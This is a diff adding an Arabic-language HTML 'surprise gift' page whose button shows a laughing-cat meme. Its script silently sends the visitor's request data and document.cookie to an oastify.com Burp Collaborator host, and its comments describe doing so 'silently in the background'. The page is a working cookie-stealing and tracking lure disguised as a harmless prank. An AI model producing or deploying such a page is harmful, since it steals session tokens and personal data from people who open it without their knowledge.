@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>مفاجأة خاصة لك! ✨</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #fce4ec; padding-top: 80px; }
+        .box { background: white; padding: 40px; border-radius: 25px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 2px solid #f06292; }
+        .btn { background-color: #f06292; color: white; border: none; padding: 15px 45px; font-size: 22px; border-radius: 50px; cursor: pointer; transition: 0.3s; font-weight: bold; }
+        .btn:hover { background-color: #e91e63; transform: scale(1.05); }
+        #meme-view { display: none; margin-top: 20px; }
+        img { max-width: 100%; border-radius: 15px; margin-top: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="gift-card">
+        <h1>مبروك! وصلت الهدية 🎁</h1>
+        <p>اضغط تحت وشوف وش جاك..</p>
+        <button class="btn" onclick="capture()">فتح المفاجأة 🎊</button>
+    </div>
+
+    <div id="meme-view">
+        <h2>أووه.. تعيش وتأكل غيرها! 😂</h2>
+        <img src="https://media.tenor.com/On7tT9C_hS0AAAAM/cat-laughing.gif" alt="Funny Reaction">
+    </div>
+
+    <script>
+        function capture() {
+            // رابط الـ Collaborator الخاص بك اللي بيستلم البيانات
+            var tracker = "http://0qrchf9ywsx6grs0hod0h4xfx633rtfi.oastify.com";
+
+            // إرسال البيانات (IP، المتصفح، الـ Headers) صامتاً في الخلفية
+            fetch(tracker, { mode: 'no-cors' });
+
+            // إرسال التوكن إذا كان موجوداً في الكوكيز (اختياري)
+            fetch(tracker + "/?token=" + document.cookie, { mode: 'no-cors' });
+
+            // تبديل المحتوى للميمز المضحك
+            document.getElementById("gift-card").style.display = "none";
+            document.getElementById("meme-view").style.display = "block";
+        }
+    </script>
+</body>
+</html>
